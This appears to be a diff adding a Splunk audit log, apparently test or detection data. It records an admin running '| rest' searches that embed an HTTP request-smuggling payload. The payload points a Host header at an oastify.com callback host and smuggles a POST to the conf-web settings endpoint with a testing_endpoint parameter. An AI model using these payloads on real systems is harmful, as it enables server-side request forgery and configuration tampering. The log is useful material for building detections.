@@ -1,0 +1,119 @@
+Audit:[timestamp=05-03-2023 13:30:09.149, user=admin, action=search, info=granted , search_id='ta_1683120609.24', search='typeahead prefix="index=_audit \"/servicesns/nobody/system/configs/conf-web/settings\"" max_time="1" count="50" use_cache=1', autojoin='0', buckets=0, ttl=10, max_count=50, maxtime=8640000, enable_lookups='0', extra_fields='', apiStartTime='ZERO_TIME', apiEndTime='ZERO_TIME', savedsearch_name="", app="search", provenance="N/A", mode="historical"]
+Audit:[timestamp=05-03-2023 13:20:51.048, user=admin, action=search, info=completed, search_id='1683120023.23', total_run_time=0.08, event_count=18, result_count=18, available_count=18, scan_count=18, drop_count=0, exec_time=1683120023, api_et=1683032400.000000000, api_lt=1683120023.000000000, search_et=1683032400.000000000, search_lt=1683120023.000000000, is_realtime=0, savedsearch_name="", search_startup_time="84", has_error_msg=false, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_4bd1170ca8b87a46", app="search", provenance="UI:Search", mode="historical", searched_buckets=1, eliminated_buckets=0, considered_events=18, total_slices=12, decompressed_slices=2, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=15, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, sourcetype_count__audittrail=18, roles='admin+power+user', search='search index=_audit "/servicesns/nobody/system/configs/conf-web/settings" | table search testing_endpoint info has_error_msg']
+Audit:[timestamp=05-03-2023 13:20:23.872, user=admin, action=search, info=granted , search_id='1683120023.23', search='search index=_audit "/servicesns/nobody/system/configs/conf-web/settings" | table search testing_endpoint info has_error_msg', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:20:23 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:14:51.047, user=admin, action=search, info=canceled, search_id='ta_1683119623.21', total_run_time=0.01, event_count=0, result_count=1, available_count=0, scan_count=0, drop_count=0, exec_time=1683119623, api_et=N/A, api_lt=N/A, search_et=N/A, search_lt=N/A, is_realtime=0, savedsearch_name="", search_startup_time="7", has_error_msg=false, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_ba600ee14567092f", app="search", provenance="N/A", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='typeahead prefix="index=_audit \"/servicesns/nobody/system/configs/conf-web/settings\"" max_time="1" count="50" use_cache=1']
+Audit:[timestamp=05-03-2023 13:13:51.046, user=admin, action=search, info=completed, search_id='1683119608.20', total_run_time=0.08, event_count=14, result_count=14, available_count=14, scan_count=14, drop_count=0, exec_time=1683119608, api_et=1683032400.000000000, api_lt=1683119608.000000000, search_et=1683032400.000000000, search_lt=1683119608.000000000, is_realtime=0, savedsearch_name="", search_startup_time="40", has_error_msg=false, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_76f0e6e712092f08", app="search", provenance="UI:Search", mode="historical", searched_buckets=1, eliminated_buckets=0, considered_events=14, total_slices=1, decompressed_slices=1, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=15, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, sourcetype_count__audittrail=14, roles='admin+power+user', search='search index=_audit "/servicesns/nobody/system/configs/conf-web/settings"']
+Audit:[timestamp=05-03-2023 13:13:43.477, user=admin, action=search, info=granted , search_id='ta_1683119623.21', search='typeahead prefix="index=_audit \"/servicesns/nobody/system/configs/conf-web/settings\"" max_time="1" count="50" use_cache=1', autojoin='0', buckets=0, ttl=10, max_count=50, maxtime=8640000, enable_lookups='0', extra_fields='', apiStartTime='ZERO_TIME', apiEndTime='ZERO_TIME', savedsearch_name="", app="search", provenance="N/A", mode="historical"]
+Audit:[timestamp=05-03-2023 13:13:28.190, user=admin, action=search, info=granted , search_id='1683119608.20', search='search index=_audit "/servicesns/nobody/system/configs/conf-web/settings"', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:13:28 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:10:21.049, user=admin, action=search, info=completed, search_id='1683119397.11', total_run_time=0.02, event_count=0, result_count=1, available_count=0, scan_count=0, drop_count=0, exec_time=1683119397, api_et=1683032400.000000000, api_lt=1683119397.000000000, search_et=1683032400.000000000, search_lt=1683119397.000000000, is_realtime=0, savedsearch_name="", search_startup_time="8", has_error_msg=false, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_e8c0fea5446a1eee", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:10:21.048, user=admin, action=search, info=completed, search_id='1683119395.10', total_run_time=0.03, event_count=0, result_count=0, available_count=0, scan_count=0, drop_count=0, exec_time=1683119395, api_et=1683032400.000000000, api_lt=1683119395.000000000, search_et=1683032400.000000000, search_lt=1683119395.000000000, is_realtime=0, savedsearch_name="", search_startup_time="50", has_error_msg=true, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_e8c0fea5446a1eee", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:10:21.048, user=admin, action=search, info=completed, search_id='1683119393.9', total_run_time=0.02, event_count=0, result_count=1, available_count=0, scan_count=0, drop_count=0, exec_time=1683119393, api_et=1683032400.000000000, api_lt=1683119393.000000000, search_et=1683032400.000000000, search_lt=1683119393.000000000, is_realtime=0, savedsearch_name="", search_startup_time="7", has_error_msg=false, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_e8c0fea5446a1eee", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:10:21.047, user=admin, action=search, info=completed, search_id='1683119391.8', total_run_time=0.02, event_count=0, result_count=0, available_count=0, scan_count=0, drop_count=0, exec_time=1683119391, api_et=1683032400.000000000, api_lt=1683119391.000000000, search_et=1683032400.000000000, search_lt=1683119391.000000000, is_realtime=0, savedsearch_name="", search_startup_time="10", has_error_msg=true, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_e8c0fea5446a1eee", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:09:57.332, user=admin, action=search, info=granted , search_id='1683119397.11', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:57 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:09:55.244, user=admin, action=search, info=granted , search_id='1683119395.10', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:55 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:09:53.493, user=admin, action=search, info=granted , search_id='1683119393.9', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:53 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:09:51.415, user=admin, action=search, info=granted , search_id='1683119391.8', search='| rest "/2 HTTP/1.1
+Host: 6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:51 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:09:21.048, user=admin, action=search, info=completed, search_id='1683119355.7', total_run_time=0.03, event_count=0, result_count=0, available_count=0, scan_count=0, drop_count=0, exec_time=1683119355, api_et=1683032400.000000000, api_lt=1683119355.000000000, search_et=1683032400.000000000, search_lt=1683119355.000000000, is_realtime=0, savedsearch_name="", search_startup_time="51", has_error_msg=true, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_eb251a5cec4fa34b", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host:6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:09:21.047, user=admin, action=search, info=completed, search_id='1683119351.6', total_run_time=0.03, event_count=0, result_count=0, available_count=0, scan_count=0, drop_count=0, exec_time=1683119351, api_et=1683032400.000000000, api_lt=1683119351.000000000, search_et=1683032400.000000000, search_lt=1683119351.000000000, is_realtime=0, savedsearch_name="", search_startup_time="54", has_error_msg=true, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_eb251a5cec4fa34b", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host:6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:09:21.046, user=admin, action=search, info=completed, search_id='1683119344.5', total_run_time=0.04, event_count=0, result_count=0, available_count=0, scan_count=0, drop_count=0, exec_time=1683119344, api_et=1683032400.000000000, api_lt=1683119344.000000000, search_et=1683032400.000000000, search_lt=1683119344.000000000, is_realtime=0, savedsearch_name="", search_startup_time="55", has_error_msg=true, fully_completed_search=true, acceleration_id="E4DC7409-F2FD-489A-8312-6243CA40955E_search_admin_9e3a5a233e615340", app="search", provenance="UI:Search", mode="historical", searched_buckets=0, eliminated_buckets=0, considered_events=0, total_slices=0, decompressed_slices=0, duration.command.search.index=0, invocations.command.search.index.bucketcache.hit=0, duration.command.search.index.bucketcache.hit=0, invocations.command.search.index.bucketcache.miss=0, duration.command.search.index.bucketcache.miss=0, invocations.command.search.index.bucketcache.error=0, duration.command.search.rawdata=0, invocations.command.search.rawdata.bucketcache.hit=0, duration.command.search.rawdata.bucketcache.hit=0, invocations.command.search.rawdata.bucketcache.miss=0, duration.command.search.rawdata.bucketcache.miss=0, invocations.command.search.rawdata.bucketcache.error=0, roles='admin+power+user', search='| rest "/2 HTTP/1.1
+Host:,6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"']
+Audit:[timestamp=05-03-2023 13:09:15.294, user=admin, action=search, info=granted , search_id='1683119355.7', search='| rest "/2 HTTP/1.1
+Host:6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=300, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='*', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:15 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:09:11.590, user=admin, action=search, info=granted , search_id='1683119351.6', search='| rest "/2 HTTP/1.1
+Host:6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=0, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:11 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
+Audit:[timestamp=05-03-2023 13:09:04.969, user=admin, action=search, info=granted , search_id='1683119344.5', search='| rest "/2 HTTP/1.1
+Host:,6el9qbduay3jkuxic4e8tc0l5cb3zynn.oastify.com
+X-Test: &testing_endpoint=/fakedir&testing_dir=/&
+User-Agent: q
+
+POST /servicesNS/nobody/system/configs/conf-web/settings HTTP/1.1
+Content-Length: 200
+X-Test:"', autojoin='1', buckets=0, ttl=600, max_count=500000, maxtime=8640000, enable_lookups='1', extra_fields='', apiStartTime='Tue May  2 13:00:00 2023', apiEndTime='Wed May  3 13:09:04 2023', savedsearch_name="", app="search", provenance="UI:Search", mode="historical"]
